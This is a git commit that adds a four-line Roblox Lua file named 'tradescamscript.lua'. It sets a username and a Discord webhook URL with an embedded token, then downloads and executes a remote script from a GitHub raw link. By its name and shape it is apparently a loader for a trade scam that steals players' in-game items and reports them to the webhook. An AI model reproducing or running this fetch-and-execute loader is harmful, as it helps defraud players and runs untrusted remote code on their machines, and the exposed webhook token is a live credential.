2762a20ed9ec2fde272d15fffd2d0d13679d430f
koekje987 <117127210+koekje987@users.noreply.github.com>
2023-03-26 18:03:15 +0200

    Add files via upload

---
+++ tradescamscript.lua
@@ -0,0 +1,4 @@
+UserName = "Koekje967"
+ Webhook = "https://discord.com/api/webhooks/1086007807603638282/ZnE_Q7dM0r9j0ZnQ_I9brCDcDknGxlsqdy4AdgG2OOUBK-8LkdGUUeXMSV90AKYTcwu4"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua%22))()
